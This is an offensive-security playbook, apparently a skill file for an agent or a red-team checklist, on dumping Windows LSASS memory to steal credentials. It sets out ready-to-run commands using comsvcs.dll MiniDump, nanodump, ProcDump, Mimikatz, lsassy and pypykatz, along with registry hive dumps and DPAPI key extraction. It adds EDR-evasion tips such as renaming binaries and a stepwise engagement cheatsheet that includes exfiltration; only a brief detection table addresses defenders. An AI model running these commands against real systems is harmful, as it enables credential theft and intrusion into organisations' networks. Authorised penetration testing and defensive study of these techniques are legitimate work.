---
name: offensive-lsass-dumping
description: "LSASS process memory dumping for credential extraction — comsvcs.dll MiniDump, Task Manager GUI dump, nanodump, lsassy, ProcDump, Mimikatz live extraction, parsing offline with pypykatz. Covers AV/EDR-evasion variants and the modern landscape where LSASS protection (RunAsPPL, Credential Guard) blocks most direct dumps."
---

# LSASS Dumping

LSASS holds in-memory NTLM hashes, Kerberos tickets, and (legacy) cleartext passwords. Dump it to extract credentials. Most modern EDR signatures the `MiniDumpWriteDump` call → multiple bypass techniques.

## Live System Requirements

- Local Administrator on the target host
- LSASS process ID: `tasklist /svc | findstr lsass.exe`

## Methods (Stealth-Ranked)

### Task Manager (GUI Route)

1. Open Task Manager (Ctrl+Shift+Esc)
2. Right-click `lsass.exe` → Create dump file
3. Dump saved to `%TEMP%`

EDR detection minimal — Task Manager is a legitimate Windows process. Best for environments where you have RDP / interactive logon.

### comsvcs.dll MiniDump

Single rundll32 invocation, no third-party binary drop:

```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\out.dmp full
```

Often blocked by modern EDR. Verify by attempting after gaining admin.

### nanodump

Avoids `MiniDumpWriteDump` API call. Uses handle duplication + in-memory walk:

```cmd
nanodump.exe --pid <PID> -w lsass.dmp --valid
```

Bypasses many EDR signatures focused on the Microsoft API. Detection landscape evolves; verify in target environment.

### ProcDump

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Microsoft-signed binary, broadly trusted. Some EDRs flag procdump.exe by name; rename to bypass.

### Mimikatz Live Extraction

```cmd
mimikatz.exe
> privilege::debug
> sekurlsa::logonpasswords
> sekurlsa::tickets /export
```

Live extraction — no dump file. Mimikatz signatures are heavily detected; SafetyKatz / SharpKatz are rebranded versions.

### lsassy (Linux-Side, Remote)

```bash
lsassy -u admin -p pass -d corp.local 10.0.0.10 10.0.0.11
# Connects via SMB, dumps LSASS, extracts credentials
```

Useful from Linux foothold without needing to drop tools on Windows targets. Detection on remote target same as if dropped tools.

## Offline Parsing

Once dumped, parse offline (no need for live system):

```bash
# pypykatz
pypykatz lsa minidump lsass.dmp

# Output: NTLM hashes, Kerberos keys, cleartext (rare on modern Win)
```

```powershell
# Mimikatz offline
mimikatz.exe
> sekurlsa::minidump lsass.dmp
> sekurlsa::logonpasswords
```

## Modern LSASS Protection

| Defense | Effect | Bypass |
|---|---|---|
| RunAsPPL (PPL) | LSASS runs as Protected Process Light | Mimi-with-driver bypass; PPLfault; or skip LSASS, use other vectors |
| Credential Guard | Cleartext + NT hash isolated in VTL1 | DCSync; Kerberos ticket capture; abuse without LSASS |
| LSA Protection (RunAsPPL) | Same | Same |

In environments with PPL + Credential Guard, LSASS dumping yields little. Focus on:

- DCSync (use ACL or `replicating-directory-changes` rights)
- Kerberos ticket capture (kerberoast / TGS-REQ instead of memory)
- Service account passwords from registry / config files
- LAPS passwords from LDAP attributes

## SAM / SECURITY / SYSTEM Dump

Local accounts and cached domain creds:

```cmd
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
reg save HKLM\SYSTEM system.save
```

```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
# Extracts: SAM (local users), LSA secrets, cached domain hashes
```

## DPAPI Master Key Extraction

Browser passwords, Wi-Fi profiles, certs, RDP creds protected by DPAPI:

```bash
# Per-user master key in %APPDATA%\Microsoft\Protect\<SID>\
mimikatz.exe
> dpapi::masterkey /file:<masterkey-file> /sid:<SID> /password:<userpw>
> dpapi::cred /in:<cred-file> /masterkey:<key>
```

## Engagement Cheatsheet

```cmd
:: 1. Try Task Manager dump (interactive)

:: 2. comsvcs.dll route (admin context)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\out.dmp full

:: 3. nanodump (EDR-aware)
nanodump.exe --pid <PID> -w lsass.dmp --valid

:: 4. SAM/SECURITY dump regardless
reg save HKLM\SAM s.save && reg save HKLM\SECURITY se.save && reg save HKLM\SYSTEM sy.save

:: 5. Exfiltrate, parse offline
pypykatz lsa minidump lsass.dmp

:: 6. Document each: target host, method, EDR observed, credentials retrieved
```

## Detection

| Signal | Defender View |
|---|---|
| MiniDumpWriteDump API call on lsass.exe | EDR alert |
| nanodump signature | More recent EDRs detect |
| reg save on SAM/SECURITY | EDR alert (sensitive registry keys) |
| Mimikatz strings in memory | YARA / EDR static signature |

Modern EDRs catch most LSASS attempts. Stealth requires either undocumented bypasses (rare) or pivoting away from LSASS to alternative credential sources.

## Key References

- nanodump: github.com/fortra/nanodump
- pypykatz: github.com/skelsec/pypykatz
- "EDR Detection Reduction" research (variousauthor)
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/lsass-dumping.md
